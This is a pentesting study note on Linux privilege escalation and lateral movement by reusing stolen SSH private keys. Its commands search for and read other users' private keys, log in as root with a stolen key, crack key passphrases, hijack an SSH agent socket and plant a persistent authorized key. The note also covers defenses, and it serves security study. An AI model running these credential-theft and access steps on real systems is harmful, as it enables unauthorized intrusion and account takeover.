---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.17 SSH Private Key Reuse"
---

# 44.17 SSH Private Key Reuse and Lateral/Vertical Movement

## 1. Introduction

Secure Shell (SSH) is the backbone of remote Linux administration. While password authentication is common, SSH public-key cryptography is widely adopted as a more secure, automated alternative. However, convenience often breeds vulnerability. System administrators frequently generate an SSH key pair and use the same private key across multiple servers, or mistakenly leave root's private key readable by unprivileged users.

SSH Private Key Reuse occurs when an attacker obtains a private SSH key (e.g., `id_rsa`, `id_ed25519`) from a compromised host and uses it to pivot to other machines, or to escalate privileges locally by logging in as a higher-privileged user (like `root`) who has authorized that same key.

## 2. Core Concepts and Underlying Mechanisms

SSH relies on asymmetric cryptography. A user generates a key pair: a public key and a private key. 
The public key is placed on the target server inside `~/.ssh/authorized_keys`. 
The private key is kept securely by the user (`~/.ssh/id_rsa`). When the user attempts to connect, the server challenges them to prove possession of the private key corresponding to an authorized public key.

### 2.1 The Vulnerability: Key Mishandling
The security of this system depends entirely on the secrecy of the private key. If the private key file has weak permissions (e.g., readable by others), or if it is inadvertently backed up into a world-readable directory, an attacker can copy it. 

### 2.2 Local Privilege Escalation vs Lateral Movement
- **Local PrivEsc**: User `alice` has `sudo` rights or administrative responsibilities. `alice`'s private key is authorized in `/root/.ssh/authorized_keys` to allow seamless local switching or script execution. If `alice` leaves her private key readable by user `bob`, `bob` can SSH as `root@localhost` using `alice`'s key.
- **Lateral Pivot**: The extracted key is used to access external servers where the same user or root has deployed the corresponding public key.

## 3. Technical Breakdown and Architecture

The following ASCII diagram illustrates the attack flow of SSH Key Reuse.

```text
+-------------------------------------------------------------------------+
|                      SSH KEY REUSE ATTACK FLOW                          |
|                                                                         |
|  [ Compromised Host A ]                                                 |
|  Low Priv Shell: 'bob'                                                  |
|                                                                         |
|  1. Enum: Discovers readable key                                        |
|     $ cat /home/alice/.ssh/id_rsa                                       |
|     -----BEGIN OPENSSH PRIVATE KEY-----                                 |
|     b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAE...                             |
|     -----END OPENSSH PRIVATE KEY-----                                   |
|                                                                         |
|  2. Steals Key                                                          |
|     (Saves to attacker's local machine or /tmp/alice_key)               |
|                                                                         |
|  3. Local PrivEsc Check          4. Lateral Movement Check              |
|     Is alice's pubkey in            Is alice's key used elsewhere?      |
|     /root/.ssh/authorized_keys?                                         |
|                                                                         |
|  +-------------------------+     +-------------------------------+      |
|  | $ ssh -i key root@127.1 |     | $ ssh -i key root@Host_B      |      |
|  | # id -> uid=0(root)     |     | # id -> uid=0(root)           |      |
|  +-------------------------+     +-------------------------------+      |
|                                                                         |
+-------------------------------------------------------------------------+
```

## 4. Enumeration Strategy

Finding private keys requires thorough file system enumeration.

### 4.1 Finding Private Keys
The standard locations are user home directories:
```bash
ls -la ~/.ssh/
ls -la /home/*/.ssh/
ls -la /root/.ssh/
```

We can use `find` to search the entire filesystem for files that look like private keys. Keys might be backed up with different extensions (e.g., `.bak`, `.old`, `.txt`).
```bash
find / -type f -name "id_rsa" -o -name "id_dsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
```

To search file contents for the private key header:
```bash
grep -rnw '/' -e "-----BEGIN RSA PRIVATE KEY-----" -e "-----BEGIN OPENSSH PRIVATE KEY-----" 2>/dev/null
```

### 4.2 Analyzing `known_hosts` and `authorized_keys`
Once a key is found, you need to know where it might be valid.
Check the `~/.ssh/known_hosts` file of the user who owns the key. This file records the IP addresses or hostnames of servers that user has previously connected to via SSH. These are prime targets for lateral movement.
```bash
cat /home/alice/.ssh/known_hosts
```

Check your own `~/.ssh/authorized_keys` to see who is allowed to log into your current account. Sometimes, root's public key is placed in a low-priv user's `authorized_keys`, indicating root frequently logs in. If you have a way to steal root's private key, you know it's actively used.

## 5. Exploitation Methodology

Once you have secured a private key, the exploitation phase involves using it to authenticate.

### 5.1 Setting Proper Permissions
SSH is extremely strict about the permissions of the private key file. If the file is overly permissive (e.g., 644), the SSH client will refuse to use it and throw a `WARNING: UNPROTECTED PRIVATE KEY FILE!` error.
You must change the permissions before using it:
```bash
chmod 600 /tmp/stolen_key
```

### 5.2 Attempting Local Escalation
Attempt to SSH into the local machine as root or another high-privileged user.
```bash
ssh -i /tmp/stolen_key root@127.0.0.1
ssh -i /tmp/stolen_key root@localhost
```
If successful, you will instantly drop into a root shell.

### 5.3 Attempting Lateral Movement
Using the IPs gathered from `known_hosts` or bash history, attempt to SSH into other hosts.
```bash
ssh -i /tmp/stolen_key admin@10.10.10.55
```

### 5.4 Bypassing Passphrase Protection
If the private key is encrypted with a passphrase, SSH will prompt you:
`Enter passphrase for key '/tmp/stolen_key':`
In this scenario, you must crack the passphrase offline.
Use `ssh2john` (part of John the Ripper suite) to extract the hash:
```bash
ssh2john stolen_key > key.hash
```
Then crack it using Hashcat or John:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
```
Once cracked, use the plaintext passphrase when prompted by SSH.

## 6. Edge Cases and SSH Agent Hijacking

If you cannot find a private key file, but you notice that a privileged user (like root or admin) is currently logged in via SSH, you might be able to hijack their SSH agent socket.

When an SSH agent is running, it holds decrypted keys in memory to provide single sign-on capabilities. The agent communicates via a Unix domain socket located in `/tmp/ssh-*/agent.*`.

If you have root access and want to pivot to another machine using a forwarded agent, or if you compromise the `admin` account and want to use their active agent:
1. Find the agent socket:
```bash
find /tmp/ -type s -name "agent.*" 2>/dev/null
```
2. Export the `SSH_AUTH_SOCK` environment variable to point to the socket.
```bash
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.1234
```
3. List the keys loaded in the agent:
```bash
ssh-add -l
```
4. If keys are present, simply SSH to the target. The client will transparently use the hijacked agent.
```bash
ssh root@target_machine
```

## 7. Post-Exploitation & Persistence

After a successful escalation via SSH keys:
- Add your own public key to `/root/.ssh/authorized_keys` to ensure permanent, passwordless access, even if the stolen key is revoked.
- Check the newly compromised machine's `known_hosts` and `.ssh` directory to continue pivoting through the network. SSH keys are the bread and butter of multi-hop network compromises.

## 8. Defense & Remediation

To defend against SSH key reuse and theft:
- **Strict Permissions**: Ensure all private keys (`id_rsa`) are set to `chmod 600` and owned by the respective user.
- **Passphrase Protection**: All private keys should be encrypted with strong passphrases to render stolen files useless without offline cracking.
- **Principle of Least Privilege**: Do not deploy a single root key across hundreds of servers. Use centralized authentication (like LDAP/Kerberos) or SSH Certificate Authorities (CA) with short-lived certificates.
- **Disable Root Login**: Set `PermitRootLogin no` or `prohibit-password` in `/etc/ssh/sshd_config`.
- **Monitor Key Usage**: Audit SSH logs (`/var/log/auth.log`) for unusual logon patterns.

## 9. Chaining Opportunities

SSH key abuse is rarely the initial vector but is a dominant secondary step.
- **Directory Traversal to Key Theft**: An LFI vulnerability on a web server can be used to extract `/home/admin/.ssh/id_rsa`.
- **Docker Mounts**: If a container is mounted with the host's `/home` directory, escaping the container simply involves reading the host user's SSH keys and logging into the host over SSH.
- **NFS Share Abuse**: A weakly configured NFS share might expose user home directories. Mounting the share allows theft of the `.ssh` directory contents.

## 10. Related Notes
- [[15 - Weak File Permissions on Sensitive Files]]
- [[16 - Password in Config Files History Env Vars]]
- [[31 - SSH Agent Hijacking]]
- [[04 - Local File Inclusion (LFI)]]
